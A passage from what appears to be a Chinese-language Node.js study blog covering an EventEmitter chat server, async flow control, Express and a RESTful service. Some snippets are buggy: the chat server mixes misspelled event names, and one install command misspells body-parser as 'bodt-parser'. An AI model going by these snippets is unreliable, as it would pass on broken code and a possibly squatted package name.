&#125;);<br>&#125;);<br><br>server.<span class=\"hljs-title function_\">listen</span>(<span class=\"hljs-number\">8000</span>,<span class=\"hljs-string\">&#x27;127.0.0.1&#x27;</span>);<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">telnet 127.0.0.1 8888<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"一个PUB-SUB的例子\"><a href=\"#一个PUB-SUB的例子\" class=\"headerlink\" title=\"一个PUB/SUB的例子\"></a>一个PUB/SUB的例子</h5><p>下面的代码定义了channel事件发射器，并带有一个监听器，可以监听channel中发生的事件并做出响应；</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//定义</span><br><span class=\"hljs-keyword\">const</span> <span class=\"hljs-title class_\">EventEmitter</span>=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;events&#x27;</span>).<span class=\"hljs-property\">EventEmitter</span>;<br><span class=\"hljs-keyword\">const</span> channel=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">EventEmitter</span>();<br>channel.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;join&#x27;</span>,<span class=\"hljs-function\">()=&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Welcome!&quot;</span>);<br>&#125;)<br><br><span class=\"hljs-comment\">//触发事件/发射事件/join是事件名称，可以为任何值</span><br>channel.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;join&#x27;</span>);<br></code></pre></td></tr></table></figure>\n\n<p>完整实现代码如下（存在只能输出一个字符的问题，似乎需要上缓存）：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> events=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;events&#x27;</span>);<br><span class=\"hljs-keyword\">const</span> net=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;net&#x27;</span>);<br><span class=\"hljs-keyword\">const</span> channel=<span class=\"hljs-keyword\">new</span> events.<span class=\"hljs-title class_\">EventEmitter</span>();<br><span class=\"hljs-keyword\">var</span> fullMessage=<span class=\"hljs-string\">&quot;&quot;</span>;<br><br>channel.<span class=\"hljs-property\">clients</span>=&#123;&#125;;<br>channel.<span class=\"hljs-property\">subscriptions</span>=&#123;&#125;;<br><br>channel.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;join&#x27;</span>,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">id,client</span>)&#123;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">clients</span>[id]=client;<br>    <span class=\"hljs-keyword\">const</span> welcomeMessage=<span class=\"hljs-string\">`Welcome! <span class=\"hljs-subst\">$&#123;<span class=\"hljs-variable language_\">this</span>.listeners(<span class=\"hljs-string\">&#x27;broadcase&#x27;</span>).length+<span class=\"hljs-number\">1</span>&#125;</span> guests online!`</span>;<br>    client.<span class=\"hljs-title function_\">write</span>(<span class=\"hljs-string\">`<span class=\"hljs-subst\">$&#123;welcomeMessage&#125;</span>\\n`</span>);<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">subscriptions</span>[id]=<span class=\"hljs-function\">(<span class=\"hljs-params\">senderId,message</span>)=&gt;</span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(id!=senderId)&#123;<br>            <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">clients</span>[id].<span class=\"hljs-title function_\">write</span>(<span class=\"hljs-string\">&quot;Message from user &quot;</span>+id+<span class=\"hljs-string\">&quot;:&quot;</span>+message+<span class=\"hljs-string\">&quot;.\\n&quot;</span>);<br>        &#125;<br>    &#125;;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;broadcase&#x27;</span>,<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">subscriptions</span>[id]);<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">`<span class=\"hljs-subst\">$&#123;id&#125;</span> has enter the chatroom.\\n`</span>);<br>    channel.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;boradcast&#x27;</span>,id,<span class=\"hljs-string\">`<span class=\"hljs-subst\">$&#123;id&#125;</span> has enter the chatroom.\\n`</span>);<br>&#125;);<br><br><span class=\"hljs-comment\">//绑定leave事件；</span><br>channel.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;leave&#x27;</span>,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">id</span>)&#123;<br>    channel.<span class=\"hljs-title function_\">removeListener</span>(<span class=\"hljs-string\">&#x27;broadcast&#x27;</span>,<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">subscriptions</span>[id]);<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">`<span class=\"hljs-subst\">$&#123;id&#125;</span> has left the chatroom.\\n`</span>);<br>    channel.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;boradcast&#x27;</span>,id,<span class=\"hljs-string\">`<span class=\"hljs-subst\">$&#123;id&#125;</span> has left the chatroom.\\n`</span>);<br>&#125;);<br><br><span class=\"hljs-comment\">//绑定lshuwdown事件,提出所有用户；</span><br>channel.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;shutdown&#x27;</span>,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">id</span>)&#123;<br>    channel.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;broadcast&#x27;</span>,<span class=\"hljs-string\">&#x27;&#x27;</span>,<span class=\"hljs-string\">&#x27;The server has shut down.\\n&#x27;</span>);<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">`<span class=\"hljs-subst\">$&#123;id&#125;</span> has close the chatroom.\\n`</span>);<br>    channel.<span class=\"hljs-title function_\">removeAllListeners</span>(<span class=\"hljs-string\">&#x27;broadcast&#x27;</span>);<br>&#125;);<br><br><span class=\"hljs-comment\">//设定监听器最多的数量为50；</span><br>channel.<span class=\"hljs-title function_\">setMaxListeners</span>(<span class=\"hljs-number\">50</span>);<br><br><span class=\"hljs-keyword\">const</span> server=net.<span class=\"hljs-title function_\">createServer</span>(<span class=\"hljs-function\"><span class=\"hljs-params\">client</span>=&gt;</span>&#123;<br>    <span class=\"hljs-keyword\">const</span> id=<span class=\"hljs-string\">`[<span class=\"hljs-subst\">$&#123;client.remoteAddress&#125;</span>:<span class=\"hljs-subst\">$&#123;client.remotePort&#125;</span>]`</span>;<br>    channel.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;join&#x27;</span>,id,client);<br>    client.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;data&#x27;</span>,<span class=\"hljs-function\"><span class=\"hljs-params\">data</span>=&gt;</span>&#123;<br>        data=data.<span class=\"hljs-title function_\">toString</span>();<br>        <span class=\"hljs-keyword\">if</span>(data===<span class=\"hljs-string\">&#x27;*&#x27;</span>)&#123;<br>            channel.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;shutdown&#x27;</span>,id);<br>        &#125;<br>        <span class=\"hljs-keyword\">if</span>(data===<span class=\"hljs-string\">&#x27;-&#x27;</span>)&#123;<br>            channel.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;leave&#x27;</span>,id);<br>        &#125;<br>        channel.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;broadcase&#x27;</span>,id,data);<br>    &#125;);<br>    client.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;close&#x27;</span>,<span class=\"hljs-function\">()=&gt;</span>&#123;<br>        channel.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;leave&#x27;</span>,id);<br>    &#125;);<br>&#125;);<br><br>server.<span class=\"hljs-title function_\">listen</span>(<span class=\"hljs-number\">8888</span>);<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"5-异步开发的难题\"><a href=\"#5-异步开发的难题\" class=\"headerlink\" title=\"5.异步开发的难题\"></a>5.异步开发的难题</h3><blockquote>\n<p>创建异步程序时，需要关注：</p>\n<p>1.事件轮询的条件；</p>\n<p>2.程序变量；</p>\n<p>3.其他随程序逻辑执行而发生变化的资源；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//作用域是如何导致bug出现的</span><br><br><span class=\"hljs-keyword\">function</span>  <span class=\"hljs-title function_\">asyncFunction</span>(<span class=\"hljs-params\">callback</span>)&#123;<br>    <span class=\"hljs-built_in\">setTimeout</span>(callback,<span class=\"hljs-number\">200</span>);<br>&#125;<br><br><span class=\"hljs-keyword\">let</span> color=<span class=\"hljs-string\">&#x27;green&#x27;</span>;\t\t\t\t<span class=\"hljs-comment\">//初始color</span><br><span class=\"hljs-title function_\">asyncFunction</span>(<span class=\"hljs-function\">()=&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">`The color is <span class=\"hljs-subst\">$&#123;color&#125;</span>.`</span>);\t\t\t<span class=\"hljs-comment\">//等待200ms输出color</span><br>&#125;);<br><br>color=<span class=\"hljs-string\">&#x27;blue&#x27;</span>\t\t\t<span class=\"hljs-comment\">//结果为输出blue；</span><br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>JS闭包可以冻结color的值；</p>\n<p>下面的例子对asyncFunction的调用被封装到一个以color为参数的匿名函数里。</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">color=<span class=\"hljs-string\">&#x27;blue&#x27;</span>\t\t\t<br>(<span class=\"hljs-function\"><span class=\"hljs-params\">color</span>=&gt;</span>&#123;<br>    <span class=\"hljs-title function_\">asyncFunction</span>(<span class=\"hljs-function\">()=&gt;</span>&#123;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">`The color is `</span>,color);<br>    &#125;);<br>&#125;)(color);<br><br>color=<span class=\"hljs-string\">&#x27;green&#x27;</span>;\t\t\t\t<span class=\"hljs-comment\">//结果为输出blue；</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"6-异步逻辑的顺序化\"><a href=\"#6-异步逻辑的顺序化\" class=\"headerlink\" title=\"6.异步逻辑的顺序化\"></a>6.异步逻辑的顺序化</h3><blockquote>\n<p>让一组异步任务顺序执行的概念被Node社区称为流程控制；</p>\n<p>控制分为：串行、并行</p>\n</blockquote>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/09/b33ca1d4d596f929.jpg\"></p>\n<h4 id=\"（1）串行流程控制\"><a href=\"#（1）串行流程控制\" class=\"headerlink\" title=\"（1）串行流程控制\"></a>（1）串行流程控制</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//以下代码用回调让任务顺序执行</span><br><span class=\"hljs-built_in\">setTimeout</span>(<span class=\"hljs-function\">()=&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Wait 1000ms...&quot;</span>);<br>    <span class=\"hljs-built_in\">setTimeout</span>(<span class=\"hljs-function\">()=&gt;</span>&#123;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Wait 500ms...&quot;</span>);<br>        <span class=\"hljs-built_in\">setTimeout</span>(<span class=\"hljs-function\">()=&gt;</span>&#123;<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Wait 100ms...&quot;</span>);<br>        &#125;,<span class=\"hljs-number\">100</span>)<br>    &#125;,<span class=\"hljs-number\">500</span>)<br>&#125;,<span class=\"hljs-number\">1000</span>)<br></code></pre></td></tr></table></figure>\n\n<p>实际情况中可能是读取文件、发送http请求等；</p>\n<h5 id=\"借助async流程控制工具执行\"><a href=\"#借助async流程控制工具执行\" class=\"headerlink\" title=\"借助async流程控制工具执行\"></a>借助async流程控制工具执行</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">npm install async<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> <span class=\"hljs-keyword\">async</span>=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;async&#x27;</span>);<br><br><span class=\"hljs-comment\">//维护一个顺序数组</span><br><span class=\"hljs-keyword\">async</span>.<span class=\"hljs-title function_\">series</span>([<br>    <span class=\"hljs-function\"><span class=\"hljs-params\">callback</span>=&gt;</span>&#123;<br>        <span class=\"hljs-built_in\">setTimeout</span>(<span class=\"hljs-function\">()=&gt;</span>&#123;<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Wawit 1000ms...&quot;</span>);<br>            <span class=\"hljs-title function_\">callback</span>();<br>        &#125;,<span class=\"hljs-number\">1000</span>);<br>    &#125;,<br>    <span class=\"hljs-function\"><span class=\"hljs-params\">callback</span>=&gt;</span>&#123;<br>        <span class=\"hljs-built_in\">setTimeout</span>(<span class=\"hljs-function\">()=&gt;</span>&#123;<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Wawit 500ms...&quot;</span>);<br>            <span class=\"hljs-title function_\">callback</span>();<br>        &#125;,<span class=\"hljs-number\">500</span>)<br>    &#125;,<br>    <span class=\"hljs-function\"><span class=\"hljs-params\">callback</span>=&gt;</span>&#123;<br>        <span class=\"hljs-built_in\">setTimeout</span>(<span class=\"hljs-function\">()=&gt;</span>&#123;<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Wawit 100ms...&quot;</span>);<br>            <span class=\"hljs-title function_\">callback</span>();<br>        &#125;,<span class=\"hljs-number\">100</span>);<br>    &#125;<br>]);<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>可读性、可维护性更强；</li>\n<li>刻意回避回调嵌套；</li>\n</ul>\n<h4 id=\"（2）实现串行化流程控制\"><a href=\"#（2）实现串行化流程控制\" class=\"headerlink\" title=\"（2）实现串行化流程控制\"></a>（2）实现串行化流程控制</h4><ul>\n<li>按照预期执行的顺序维护一个数组；</li>\n<li>FIFO方法完成任务；</li>\n<li>每个任务完成以后调用一个函数来返回任务执行的成功与否；</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">TaskA</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Doing work A!&quot;</span>);<br>    <span class=\"hljs-title function_\">next</span>();<br>&#125;<br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">TaskB</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Doing work B!&quot;</span>);<br>    <span class=\"hljs-title function_\">next</span>();<br>&#125;<br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">TaskC</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Doing work C!&quot;</span>);<br>    <span class=\"hljs-title function_\">next</span>();<br>&#125;<br><br><span class=\"hljs-comment\">//维护的一个数组；</span><br><span class=\"hljs-keyword\">const</span> tasks=[<span class=\"hljs-title class_\">TaskA</span>,<span class=\"hljs-title class_\">TaskB</span>,<span class=\"hljs-title class_\">TaskC</span>];<br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">next</span>(<span class=\"hljs-params\">err,result</span>)&#123;<br>    <span class=\"hljs-keyword\">if</span>(err) <span class=\"hljs-keyword\">throw</span> err;\t\t\t\t   <span class=\"hljs-comment\">//如果出错，就抛出错误</span><br>    <span class=\"hljs-keyword\">const</span> currentTask=tasks.<span class=\"hljs-title function_\">shift</span>();\t<span class=\"hljs-comment\">//没有出错，移动数组；</span><br>    <span class=\"hljs-keyword\">if</span>(currentTask)&#123;<br>       <span class=\"hljs-title function_\">currentTask</span>(result);<br>    &#125;<br>&#125;<br><br><span class=\"hljs-title function_\">next</span>();<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"（3）实现并行化流程控制\"><a href=\"#（3）实现并行化流程控制\" class=\"headerlink\" title=\"（3）实现并行化流程控制\"></a>（3）实现并行化流程控制</h4><blockquote>\n<p>为了让异步任务并行执行，人需要维护一个数组；但是此时任务的存放顺序无关紧要；</p>\n</blockquote>\n<h4 id=\"（4）利用社区的工具进行流程控制\"><a href=\"#（4）利用社区的工具进行流程控制\" class=\"headerlink\" title=\"（4）利用社区的工具进行流程控制\"></a>（4）利用社区的工具进行流程控制</h4><ul>\n<li>Async</li>\n<li>Step</li>\n<li>Seq</li>\n</ul>\n<h2 id=\"三、Node-Web\"><a href=\"#三、Node-Web\" class=\"headerlink\" title=\"三、Node Web\"></a>三、Node Web</h2><ul>\n<li>创建一个新的Web程序</li>\n<li>搭建RESTful服务</li>\n<li>持久化数据</li>\n<li>使用模板</li>\n</ul>\n<h3 id=\"1-Node-Web程序结构\"><a href=\"#1-Node-Web程序结构\" class=\"headerlink\" title=\"1.Node Web程序结构\"></a>1.Node Web程序结构</h3><ul>\n<li>package.json  包含依赖项列表和运行这个程序的命令的文件；</li>\n<li>public/             静态资源文件夹，css/客户端js都在这；</li>\n<li>node_modules/ 项目的依赖项会安装到这里；</li>\n</ul>\n<h5 id=\"程序代码\"><a href=\"#程序代码\" class=\"headerlink\" title=\"程序代码\"></a>程序代码</h5><ul>\n<li>app.js/index.js          设置程序的代码；</li>\n<li>models/                    数据库模型；</li>\n<li>views/                       用来渲染的页面模板；</li>\n<li>controllers/routes      HTTP请求处理器；</li>\n<li>middleware/              中间件组件；</li>\n</ul>\n<blockquote>\n<p>如何组织程序是我的自由，大部分web框架都很灵活；</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">npm install --save express<br>npm rm express --save<br></code></pre></td></tr></table></figure>\n\n<p>一个简单的服务器，使用express（）创建一个程序实例，添加路由处理器，然后将实例绑定到一个TCP端口；</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> express=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;express&#x27;</span>);<br><br><span class=\"hljs-keyword\">const</span> app=<span class=\"hljs-title function_\">express</span>();<br><br><span class=\"hljs-keyword\">const</span> port=process.<span class=\"hljs-property\">env</span>.<span class=\"hljs-property\">PORT</span> || <span class=\"hljs-number\">3000</span>;<br><br>app.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;/&#x27;</span>,<span class=\"hljs-function\">(<span class=\"hljs-params\">req,res</span>)=&gt;</span>&#123;<br>    res.<span class=\"hljs-title function_\">send</span>(<span class=\"hljs-string\">&quot;Hello,world!&quot;</span>);<br>&#125;);<br><br>app.<span class=\"hljs-title function_\">listen</span>(port,<span class=\"hljs-function\">()=&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">`Express web app available at localhost:<span class=\"hljs-subst\">$&#123;port&#125;</span>`</span>);<br>&#125;)<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"npm脚本\"><a href=\"#npm脚本\" class=\"headerlink\" title=\"npm脚本\"></a>npm脚本</h5><blockquote>\n<p>启动服务起的命令（<code>node index.js</code>）可以保存问npm脚本；如下可以使用<code>npm start</code>启动项目；</p>\n</blockquote>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs json\"><span class=\"hljs-attr\">&quot;scripts&quot;</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-punctuation\">&#123;</span><br>   <span class=\"hljs-attr\">&quot;start&quot;</span><span class=\"hljs-punctuation\">:</span><span class=\"hljs-string\">&quot;node index.js&quot;</span><br> <span class=\"hljs-punctuation\">&#125;</span><span class=\"hljs-punctuation\">,</span><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"搭建一个RESTful-Web服务\"><a href=\"#搭建一个RESTful-Web服务\" class=\"headerlink\" title=\"搭建一个RESTful Web服务\"></a>搭建一个RESTful Web服务</h5><ul>\n<li>POST  /articles   </li>\n<li>GET    /articles/:id</li>\n<li>GET    /articles</li>\n<li>DELETE  /articles/:id</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">curl http://127.0.0.1:3000/articles/0<br>curl -X DELETE http://127.0.0.1:3000/articles/0<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\"><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">官方消息体解析器</span><br>npm install --save bodt-parser<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> express=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;express&#x27;</span>);<br><span class=\"hljs-keyword\">const</span> bodyParser=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;body-parser&#x27;</span>);<br><br><span class=\"hljs-keyword\">const</span> articles=[&#123;<span class=\"hljs-attr\">title</span>:<span class=\"hljs-string\">&#x27;NodeJS入门&#x27;</span>&#125;,&#123;<span class=\"hljs-attr\">title</span>:<span class=\"hljs-string\">&#x27;VueJS入门&#x27;</span>&#125;,&#123;<span class=\"hljs-attr\">title</span>:<span class=\"hljs-string\">&#x27;深入浅出VueJS&#x27;</span>&#125;];<br><br><span class=\"hljs-keyword\">const</span> app=<span class=\"hljs-title function_\">express</span>();<br><br>app.<span class=\"hljs-title function_\">set</span>(<span class=\"hljs-string\">&#x27;port&#x27;</span>,process.<span class=\"hljs-property\">env</span>.<span class=\"hljs-property\">PORT</span>||<span class=\"hljs-number\">3000</span>);<br><br>app.<span class=\"hljs-title function_\">use</span>(bodyParser.<span class=\"hljs-title function_\">json</span>());<br>app.<span class=\"hljs-title function_\">use</span>(bodyParser.<span class=\"hljs-title 